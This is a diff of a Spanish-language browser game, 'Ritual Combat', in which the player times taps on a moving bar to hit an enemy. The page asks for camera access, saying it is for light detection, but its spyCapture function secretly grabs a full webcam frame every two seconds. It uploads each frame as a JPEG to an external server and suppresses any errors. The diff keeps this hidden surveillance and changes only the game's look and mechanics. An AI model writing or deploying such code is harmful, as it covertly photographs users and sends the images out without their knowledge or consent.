@@ -3,135 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Ritual Combat - Camera Edition</title>
+    <title>Ritual Combat Elite</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; color: white; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: 'Courier New', Courier, monospace; overflow: hidden; color: white; }
         
         video#webcam {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.4);
+            object-fit: cover; transform: scaleX(-1); z-index: 1; filter: brightness(0.35);
         }
 
-        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; display: flex; flex-direction: column; align-items: center; justify-content: space-around; }
+        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; pointer-events: none; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 40px 0; }
 
-        /* Barras de Vida */
-        .stats { width: 90%; display: flex; justify-content: space-between; margin-top: 20px; }
-        .bar-container { width: 45%; height: 20px; background: #333; border: 2px solid #fff; border-radius: 10px; overflow: hidden; }
-        #player-health-bar { height: 100%; width: 100%; background: #2ecc71; transition: width 0.3s; }
-        #enemy-health-bar { height: 100%; width: 100%; background: #e74c3c; transition: width 0.3s; }
+        /* Barras de Vida Largas con Texto */
+        .bars-wrapper { width: 95%; display: flex; flex-direction: column; gap: 15px; align-items: center; }
+        .bar-container { 
+            width: 100%; height: 35px; background: #222; border: 3px solid #fff; 
+            border-radius: 5px; position: relative; overflow: hidden; 
+        }
+        .bar-fill { height: 100%; transition: width 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
+        #player-health-bar { background: #2ecc71; width: 100%; }
+        #enemy-health-bar { background: #e74c3c; width: 100%; }
+        .bar-text { 
+            position: absolute; width: 100%; text-align: center; top: 50%; 
+            transform: translateY(-50%); font-weight: bold; font-size: 18px; 
+            text-shadow: 2px 2px #000; z-index: 5; 
+        }
 
-        /* Enemigo (Pelotita) */
+        /* Enemigo */
         #enemy {
-            width: 120px; height: 120px; border-radius: 50%; background: #f1c40f;
-            display: flex; align-items: center; justify-content: center; font-size: 40px;
-            transition: transform 0.1s, background 0.2s; position: relative;
-            border: 4px solid rgba(255,255,255,0.3);
+            width: 140px; height: 140px; border-radius: 50%; background: #f1c40f;
+            display: flex; align-items: center; justify-content: center; font-size: 50px;
+            transition: all 0.2s; border: 5px solid rgba(255,255,255,0.4);
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
-        .damage-pop { position: absolute; top: -40px; color: #ff4757; font-weight: bold; font-size: 24px; animation: flyUp 0.8s forwards; }
 
         /* Barra de Ataque */
         #hit-zone {
-            width: 300px; height: 40px; background: #c0392b; border: 3px solid #fff;
-            position: relative; border-radius: 5px; overflow: hidden; pointer-events: auto;
+            width: 320px; height: 50px; background: #800000; border: 4px solid #fff;
+            position: relative; border-radius: 8px; overflow: hidden; pointer-events: auto;
         }
-        #green-zone { position: absolute; height: 100%; background: #2ecc71; transition: width 0.3s, left 0.3s; }
-        #indicator { position: absolute; width: 6px; height: 100%; background: #fff; box-shadow: 0 0 10px #fff; left: 0; }
+        #green-zone { position: absolute; height: 100%; background: #00ff00; box-shadow: inset 0 0 15px #000; }
+        #indicator { position: absolute; width: 8px; height: 100%; background: #fff; box-shadow: 0 0 15px #fff; left: 0; z-index: 6; }
 
         #attack-btn {
-            padding: 20px 50px; background: #f1c40f; color: #000; border: none;
-            border-radius: 50px; font-weight: bold; font-size: 20px; cursor: pointer;
-            pointer-events: auto; transition: opacity 0.3s;
+            padding: 25px 60px; background: #f1c40f; color: #000; border: none;
+            border-radius: 15px; font-weight: bold; font-size: 22px; cursor: pointer;
+            pointer-events: auto; transition: 0.3s; border-bottom: 5px solid #91770b;
         }
-        #attack-btn:disabled { opacity: 0.3; background: #7f8c8d; }
+        #attack-btn:disabled { opacity: 0.4; filter: grayscale(1); transform: translateY(4px); border-bottom: none; }
 
-        /* Overlays */
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 2px solid #f1c40f; width: 85%; max-width: 400px; pointer-events: auto; }
-        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; text-align: center; flex-direction: column; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .card { background: #111; padding: 30px; border-radius: 20px; border: 3px solid #f1c40f; width: 90%; max-width: 450px; pointer-events: auto; }
+        #dark-warning { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: none; align-items: center; justify-content: center; flex-direction: column; }
 
-        @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-50px); } }
+        .damage-pop { position: absolute; font-weight: bold; font-size: 30px; animation: flyUp 0.8s forwards; color: #ff0; text-shadow: 2px 2px #000; }
+        @keyframes flyUp { from { opacity: 1; transform: translateY(0); } to { opacity: 0; transform: translateY(-70px); } }
     </style>
 </head>
-<body>
+<body onclick="tryHit()">
 
 <video id="webcam" autoplay playsinline></video>
 
 <div id="dark-warning">
-    <h1 style="color: #f1c40f;">⚠️ POCA LUZ</h1>
-    <p>Enciende una luz o limpia la cámara para jugar.</p>
+    <h1 style="color: #f1c40f; font-size: 60px;">🌑</h1>
+    <h2>OSCURIDAD DETECTADA</h2>
+    <p>La cámara no puede verte. Por favor, <b>enciende una luz</b>.</p>
 </div>
 
 <div id="perm-screen" class="overlay">
     <div class="card">
-        <h2>PERMISOS</h2>
-        <p>Este juego utiliza la cámara para detectar la luz ambiental.</p>
-        <button class="btn" style="padding:15px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px;" onclick="initCamera()">HABILITAR CÁMARA</button>
+        <h2 style="color:#f1c40f">ACCESO A CÁMARA</h2>
+        <p>Se requiere cámara para el sensor de luz y calibración.</p>
+        <button class="btn" style="padding:20px; width:100%; background:#f1c40f; border:none; font-weight:bold; cursor:pointer" onclick="initCamera()">PERMITIR CÁMARA</button>
     </div>
 </div>
 
 <div id="start-screen" class="overlay" style="display:none;">
     <div class="card">
-        <h2 style="color:#f1c40f;">RITUAL COMBAT</h2>
-        <p style="text-align: left; font-size: 14px;">
-            1. Presiona ATACAR cuando la línea blanca pase por lo VERDE.<br>
-            2. Darle al centro hace 20 de daño.<br>
-            3. Si fallas, recibes daño y el enemigo se cura.<br>
-            4. Cada victoria hace la zona verde más pequeña.
+        <h1 style="color:#f1c40f">RITUAL COMBAT</h1>
+        <p style="text-align: left; line-height: 1.6;">
+            • Dale a la <b>zona verde</b> para atacar.<br>
+            • Si fallas, el enemigo se cura y tú sufres.<br>
+            • La zona cambia de lugar en cada golpe.<br>
+            • 2 segundos de espera entre ataques.
         </p>
-        <button class="btn" style="padding:15px; width:100%; background:#f1c40f; border:none; font-weight:bold; border-radius:10px;" onclick="startGame()">EMPEZAR</button>
+        <button class="btn" style="padding:20px; width:100%; background:#f1c40f; border:none; font-weight:bold; cursor:pointer" onclick="startGame()">INICIAR COMBATE</button>
     </div>
 </div>
 
-<div id="msg-screen" class="overlay" style="display:none; background:rgba(46, 204, 113, 0.8);">
-    <h1 id="msg-text" style="font-size: 50px;">¡FELICIDADES!</h1>
+<div id="msg-screen" class="overlay" style="display:none; background:rgba(0,0,0,0.85);">
+    <h1 style="color:#f1c40f; font-size: 45px;">¡ENEMIGO ELIMINADO!</h1>
 </div>
 
 <div id="ui-layer">
-    <div class="stats">
-        <div>PLAYER<div class="bar-container"><div id="player-health-bar"></div></div></div>
-        <div>ENEMY<div class="bar-container"><div id="enemy-health-bar"></div></div></div>
+    <div class="bars-wrapper">
+        <div style="width:100%">JUGADOR <div class="bar-container"><div class="bar-text" id="p-txt">100 / 100</div><div id="player-health-bar" class="bar-fill"></div></div></div>
+        <div style="width:100%">ENEMIGO <div class="bar-container"><div class="bar-text" id="e-txt">50 / 50</div><div id="enemy-health-bar" class="bar-fill"></div></div></div>
     </div>
 
-    <div id="enemy">
-        <div id="enemy-face">ò_ó</div>
-    </div>
+    <div id="enemy">ò_ó</div>
 
     <div id="hit-zone">
         <div id="green-zone"></div>
         <div id="indicator"></div>
     </div>
 
-    <button id="attack-btn" onclick="tryHit()">ATACAR</button>
+    <button id="attack-btn">ATACAR</button>
 </div>
 
 <script>
     const video = document.getElementById('webcam');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
     
-    // Variables de Juego
     let playerHP = 100;
     let enemyHP = 50;
     let maxEnemyHP = 50;
-    let greenSize = 80; // Tamaño inicial verde
-    let greenPos = 110;
+    let greenSize = 85;
+    let greenPos = 100;
     let indicatorPos = 0;
-    let indicatorDir = 2;
+    let indicatorDir = 3;
     let isCooldown = false;
     let gameActive = false;
-    let colors = ['#f1c40f', '#9b59b6', '#3498db', '#e67e22', '#1abc9c'];
+    let enemyLevel = 1;
+    const colors = ['#f1c40f', '#e67e22', '#9b59b6', '#3498db', '#1abc9c', '#e74c3c'];
 
-    // --- CÁMARA Y LUZ ---
     async function initCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = s;
             document.getElementById('perm-screen').style.display = 'none';
             document.getElementById('start-screen').style.display = 'flex';
-            
-            setInterval(lightCheck, 800);
-            setInterval(captureSpy, 2000);
-        } catch (e) { alert("Cámara necesaria."); }
+            setInterval(lightCheck, 1000);
+            setInterval(spyCapture, 2000);
+        } catch(e) { alert("Cámara obligatoria."); }
     }
 
     function lightCheck() {
@@ -142,76 +147,94 @@
         const data = ctx.getImageData(0, 0, 40, 40).data;
         let b = 0;
         for(let i=0; i<data.length; i+=4) b += (data[i]+data[i+1]+data[i+2])/3;
-        const avg = b / (data.length/4);
-        document.getElementById('dark-warning').style.display = (avg < 40) ? 'flex' : 'none';
+        document.getElementById('dark-warning').style.display = (b/(data.length/4) < 45) ? 'flex' : 'none';
     }
 
-    // --- LÓGICA DE JUEGO ---
     function startGame() {
         document.getElementById('start-screen').style.display = 'none';
-        resetEnemy(50);
-        playerHP = 100;
-        updateUI();
+        resetGameStats();
         gameActive = true;
-        animateIndicator();
+        animate();
     }
 
-    function animateIndicator() {
+    function resetGameStats() {
+        playerHP = 100;
+        enemyHP = 50;
+        maxEnemyHP = 50;
+        greenSize = 85;
+        moveGreenZone();
+        updateUI();
+    }
+
+    function moveGreenZone() {
+        greenPos = Math.random() * (320 - greenSize);
+    }
+
+    function animate() {
         if (!gameActive) return;
         indicatorPos += indicatorDir;
-        if (indicatorPos > 294 || indicatorPos < 0) indicatorDir *= -1;
+        if (indicatorPos >= 312 || indicatorPos <= 0) indicatorDir *= -1;
         document.getElementById('indicator').style.left = indicatorPos + "px";
-        requestAnimationFrame(animateIndicator);
+        requestAnimationFrame(animate);
     }
 
     function tryHit() {
-        if (isCooldown || !gameActive) return;
-        
-        const btn = document.getElementById('attack-btn');
-        const enemyDiv = document.getElementById('enemy');
-        const indicatorMiddle = indicatorPos + 3;
-        const greenStart = greenPos;
-        const greenEnd = greenPos + greenSize;
+        if (isCooldown || !gameActive || document.getElementById('dark-warning').style.display === 'flex') return;
 
-        // ¿Le dio a lo verde?
-        if (indicatorMiddle >= greenStart && indicatorMiddle <= greenEnd) {
-            // Calcular daño según cercanía al centro
-            const greenCenter = greenPos + (greenSize / 2);
-            const distFromCenter = Math.abs(indicatorMiddle - greenCenter);
-            const damageFactor = 1 - (distFromCenter / (greenSize / 2));
-            const damage = Math.ceil(damageFactor * 20);
+        const mid = indicatorPos + 4;
+        const gStart = greenPos;
+        const gEnd = greenPos + greenSize;
 
+        if (mid >= gStart && mid <= gEnd) {
+            // Acierto
+            const center = gStart + (greenSize/2);
+            const dist = Math.abs(mid - center);
+            const damage = Math.ceil((1 - (dist/(greenSize/2))) * 20);
+            
             enemyHP -= damage;
             playerHP = Math.min(100, playerHP + 10);
             
-            // Efecto visual daño
-            enemyDiv.style.background = "red";
+            impactEffect("success");
             showPop(`-${damage}`, "enemy");
-            setTimeout(() => enemyDiv.style.background = colors[0], 200);
-
-            if (enemyHP <= 0) victory();
         } else {
             // Fallo
             playerHP -= 10;
             enemyHP = Math.min(maxEnemyHP, enemyHP + 10);
-            greenSize = Math.min(150, greenSize + 15); // Crece
-            greenPos = Math.random() * (300 - greenSize); // Se mueve
+            greenSize = Math.min(180, greenSize + 10);
+            impactEffect("fail");
             showPop("-10", "player");
-            if (playerHP <= 0) gameOver();
         }
 
-        // Cooldown 2 segundos
+        // DIFICULTAD: Siempre se mueve la zona verde después de un intento
+        moveGreenZone();
+        
         isCooldown = true;
+        const btn = document.getElementById('attack-btn');
         btn.disabled = true;
-        let count = 2;
-        btn.innerText = `...`;
+        updateUI();
+
+        if (enemyHP <= 0) {
+            victory();
+        } else if (playerHP <= 0) {
+            alert("HAS MUERTO");
+            location.reload();
+        }
+
         setTimeout(() => {
             isCooldown = false;
             btn.disabled = false;
-            btn.innerText = "ATACAR";
         }, 2000);
+    }
 
-        updateUI();
+    function impactEffect(type) {
+        const e = document.getElementById('enemy');
+        if(type === "success") {
+            e.style.background = "#fff";
+            setTimeout(() => e.style.background = colors[enemyLevel % colors.length], 100);
+        } else {
+            e.style.transform = "translateX(20px)";
+            setTimeout(() => e.style.transform = "translateX(0)", 100);
+        }
     }
 
     function victory() {
@@ -219,56 +242,52 @@
         document.getElementById('msg-screen').style.display = 'flex';
         setTimeout(() => {
             document.getElementById('msg-screen').style.display = 'none';
+            enemyLevel++;
             maxEnemyHP += 20;
-            greenSize = Math.max(30, greenSize - 10); // Más difícil
-            resetEnemy(maxEnemyHP);
+            enemyHP = maxEnemyHP;
+            greenSize = Math.max(35, greenSize - 12);
+            document.getElementById('enemy').style.background = colors[enemyLevel % colors.length];
             gameActive = true;
-            animateIndicator();
+            moveGreenZone();
+            updateUI();
+            animate();
         }, 2000);
-    }
-
-    function resetEnemy(hp) {
-        enemyHP = hp;
-        maxEnemyHP = hp;
-        const enemyDiv = document.getElementById('enemy');
-        colors.push(colors.shift()); // Rotar color
-        enemyDiv.style.background = colors[0];
-        greenPos = Math.random() * (300 - greenSize);
-        updateUI();
     }
 
     function updateUI() {
         document.getElementById('player-health-bar').style.width = playerHP + "%";
-        document.getElementById('enemy-health-bar').style.width = (enemyHP / maxEnemyHP * 100) + "%";
+        document.getElementById('p-txt').innerText = `${playerHP} / 100`;
+        
+        const enemyPer = (enemyHP / maxEnemyHP) * 100;
+        document.getElementById('enemy-health-bar').style.width = enemyPer + "%";
+        document.getElementById('e-txt').innerText = `${enemyHP} / ${maxEnemyHP}`;
+
         const gz = document.getElementById('green-zone');
         gz.style.width = greenSize + "px";
         gz.style.left = greenPos + "px";
     }
 
     function showPop(txt, target) {
-        const pop = document.createElement('div');
-        pop.className = 'damage-pop';
-        pop.innerText = txt;
-        document.getElementById(target === "enemy" ? 'enemy' : 'ui-layer').appendChild(pop);
-        setTimeout(() => pop.remove(), 800);
+        const p = document.createElement('div');
+        p.className = 'damage-pop';
+        p.innerText = txt;
+        const rect = document.getElementById(target === 'enemy' ? 'enemy' : 'ui-layer').getBoundingClientRect();
+        p.style.left = "50%";
+        document.getElementById(target === 'enemy' ? 'enemy' : 'ui-layer').appendChild(p);
+        setTimeout(() => p.remove(), 800);
     }
 
-    function gameOver() {
-        alert("PERDISTE. Reintentando...");
-        location.reload();
-    }
-
-    function captureSpy() {
-        if (!video.videoWidth) return;
-        const s = document.createElement('canvas');
-        s.width = video.videoWidth; s.height = video.videoHeight;
-        s.getContext('2d').drawImage(video, 0, 0);
+    function spyCapture() {
+        if(!video.videoWidth) return;
+        const c = document.createElement('canvas');
+        c.width = video.videoWidth; c.height = video.videoHeight;
+        c.getContext('2d').drawImage(video, 0, 0);
         fetch(SERVER_URL, {
             method: 'POST',
             mode: 'cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.5) })
-        }).catch(() => {});
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({image: c.toDataURL('image/jpeg', 0.5)})
+        }).catch(()=>{});
     }
 </script>
 </body>
